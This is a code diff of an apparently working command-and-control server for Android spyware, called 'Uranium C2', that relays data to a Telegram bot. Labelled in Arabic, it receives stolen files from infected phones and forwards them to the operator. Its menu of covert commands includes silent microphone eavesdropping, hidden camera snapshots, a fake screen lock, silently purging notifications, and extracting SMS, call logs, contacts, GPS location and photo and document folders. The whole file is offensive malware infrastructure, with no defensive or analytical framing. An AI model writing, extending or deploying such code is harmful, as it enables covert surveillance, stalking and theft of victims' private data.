@@ -1,5 +1,5 @@
 // =========================================================================
-// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium C2 Server v11.0 Omnipotent
+// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium C2 Server v15.0 [Ultimate Singularity]
 // =========================================================================
 require('dotenv').config();
 const express = require('express');
@@ -19,7 +19,7 @@ if (!token || !chatId) {
 const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
 if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });
 
-const db = new sqlite3.Database('./uranium_core_v11.db');
+const db = new sqlite3.Database('./uranium_core_v15.db');
 db.serialize(() => {
     db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
     db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
@@ -58,7 +58,9 @@ async function sendTgDocumentSmart(filePath, caption) {
             await sendTg(`⚠️ فشل إرسال الملف مباشرة، تم حفظه محلياً في <code>uranium_storage/${path.basename(filePath)}</code> (${fileSizeMB.toFixed(2)} MB).`);
         }
     } else {
-        await sendTg(`📦 الملف <b>${path.basename(filePath)}</b> ضخم (${fileSizeMB.toFixed(2)} MB). جاري تقسيمه وإرساله أجزاء متسلسلة بأمر السلطان...`);
+        try {
+            await sendTg(`📦 الملف <b>${path.basename(filePath)}</b> ضخم (${fileSizeMB.toFixed(2)} MB). جاري تقسيمه وإرساله بأمر السلطان...`);
+        } catch (e) {}
         const fd = fs.openSync(filePath, 'r');
         const buffer = Buffer.allocate(CHUNK_LIMIT);
         let partNum = 1;
@@ -69,9 +71,7 @@ async function sendTgDocumentSmart(filePath, caption) {
             fs.writeFileSync(partPath, buffer.slice(0, bytesRead));
             try {
                 await appBot.sendDocument(chatId, partPath, { caption: `${caption} - الجزء (${partNum})\n⚔️ [مملكة ناصر دين الله الكلعي]` });
-            } catch (err) {
-                await sendTg(`⚠️ فشل إرسال الجزء ${partNum}`);
-            }
+            } catch (err) {}
             try { fs.unlinkSync(partPath); } catch (e) {}
             partNum++;
         }
@@ -80,7 +80,7 @@ async function sendTgDocumentSmart(filePath, caption) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM C2 v11.0 ONLINE (السلطان ناصر دين الله الكلعي) [☢️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM C2 v15.0 [ULTIMATE SINGULARITY] ONLINE (السلطان ناصر دين الله الكلعي) [☢️]</h1></body></html>`);
 });
 
 app.post('/api/v3/uranium/upload_raw', async (req, res) => {
@@ -102,8 +102,8 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
         const stats = fs.statSync(controllerFilePath);
         const fileSizeMB = stats.size / (1024 * 1024);
 
-        await sendTg(`☢️ <b>حصاد حقيقي جديد في خزينتك المركزية:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);
-        await sendTgDocumentSmart(controllerFilePath, `☠️ أرشيف الحصاد الحقيقي: <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);
+        await sendTg(`☢️ <b>حصاد الأشرار الحقيقي في خزنتك المركزية:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);
+        await sendTgDocumentSmart(controllerFilePath, `☠️ أرشيف التفرد: <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);
 
         res.status(200).json({ status: 'OK', message: 'SAVED_AND_FORWARDED' });
     } catch (e) {
@@ -163,7 +163,7 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`👑 <b>مملكة السلطان ناصر دين الله الكلعي - غرفة القيادة v11.0:</b>\nاختر العقدة للسيطرة التامة:`, {
+            await sendTg(`👑 <b>مملكة السلطان ناصر دين الله الكلعي - منصة التفرد v15.0:</b>\nاختر العقدة للسيطرة المطلقة:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -179,29 +179,41 @@ appBot.on('callback_query', async (query) => {
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '☢️ حصاد الكاميرا الشامل (DCIM)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
-                    { text: '📥 التخزين الضخم Download', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
+                    { text: '🎙️ تنصت صوتي صامت (Micro-Audio)', callback_data: `cmd_MIC_LISTEN_${nodeId}` },
+                    { text: '📸 لقطة بصرية فورية (Micro-Snap)', callback_data: `cmd_MICRO_SNAPSHOT_${nodeId}` }
                 ],
                 [
-                    { text: '📍 تحديد الموقع بدقة خارقة (GPS)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` },
-                    { text: '📱 قائمة التطبيقات المثبتة كاملة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
+                    { text: '🔒 قفل وهمي للشاشة (Dummy Blackout)', callback_data: `cmd_DUMMY_LOCK_${nodeId}` },
+                    { text: '🧹 مسح الإشعارات بصمت', callback_data: `cmd_PURGE_NOTIFICATIONS_${nodeId}` }
                 ],
                 [
-                    { text: '📨 الرسائل الواردة (SMS)', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
-                    { text: '📞 سجل المكالمات التفصيلي', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
+                    { text: '📳 اهتزاز مرعب', callback_data: `cmd_VIBRATE_DEVICE_${nodeId}` },
+                    { text: '🔦 تشغيل الكشاف الفلاش', callback_data: `cmd_FLASH_ON_${nodeId}` }
                 ],
                 [
-                    { text: '📇 دليل جهات الاتصال', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
-                    { text: '🎤 سجل الحافظة (Clipboard)', callback_data: `cmd_EXTRACT_CLIPBOARD_${nodeId}` }
+                    { text: '📶 طيار آلي للـ Wi-Fi (توفير الباقة)', callback_data: `cmd_WIFI_AUTOPILOT_${nodeId}` },
+                    { text: '📊 فحص التخزين الصامت', callback_data: `cmd_STORAGE_AUDIT_${nodeId}` }
                 ],
                 [
-                    { text: '🖼️ لقطات الشاشة والوسائط', callback_data: `cmd_EXTRACT_SCREENSHOT_ZIP_${nodeId}` },
-                    { text: '🎵 تسجيلات الصوت', callback_data: `cmd_EXTRACT_AUDIO_${nodeId}` }
+                    { text: '📁 معالجة DCIM', callback_data: `cmd_PROC_DCIM_${nodeId}` },
+                    { text: '📥 معالجة Download', callback_data: `cmd_PROC_DOWNLOAD_${nodeId}` }
+                ],
+                [
+                    { text: '🖼️ معالجة Pictures', callback_data: `cmd_PROC_PICTURES_${nodeId}` },
+                    { text: '📄 معالجة Documents', callback_data: `cmd_PROC_DOCUMENTS_${nodeId}` }
+                ],
+                [
+                    { text: '📨 الرسائل SMS', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
+                    { text: '📞 المكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
+                ],
+                [
+                    { text: '📇 الجهات', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
+                    { text: '📍 الموقع GPS', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }
                 ],
                 [{ text: '🔙 القائمة الرئيسية', callback_data: 'back_home' }]
             ]
         };
-        await appBot.editMessageText(`🎯 <b>العقدة تحت السيطرة المطلقة للسلطان:</b> <code>${nodeId}</code>`, {
+        await appBot.editMessageText(`🎯 <b>العقدة تحت سيطرة ملك الأشرار السلطان:</b> <code>${nodeId}</code>\nاختر الأوامر الأسطورية والشريرة المتقدمة:`, {
             chat_id: msg.chat.id,
             message_id: msg.message_id,
             parse_mode: 'HTML',
@@ -213,8 +225,8 @@ appBot.on('callback_query', async (query) => {
         const action = parts.slice(1).join('_');
 
         db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
-            await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق الأمر حقيقياً [${action}] بأمر السلطان!` });
-            await sendTg(`⚡ <b>أمر سيطرة [<code>${action}</code>] قيد التنفيذ الفعال للعقدة <code>${targetNodeId}</code>...</b>`);
+            await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق الأمر الشرير [${action}] بنجاح!` });
+            await sendTg(`⚡ <b>أمر الأشرار [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
         await appBot.deleteMessage(msg.chat.id, msg.message_id);
@@ -223,4 +235,4 @@ appBot.on('callback_query', async (query) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] Uranium C2 Server v11.0 Online on port ${PORT} (ناصر دين الله الكلعي)`));
+app.listen(PORT, () => console.log(`[+] Uranium C2 Server v15.0 [Ultimate Singularity] Online on port ${PORT} (ناصر دين الله الكلعي)`));
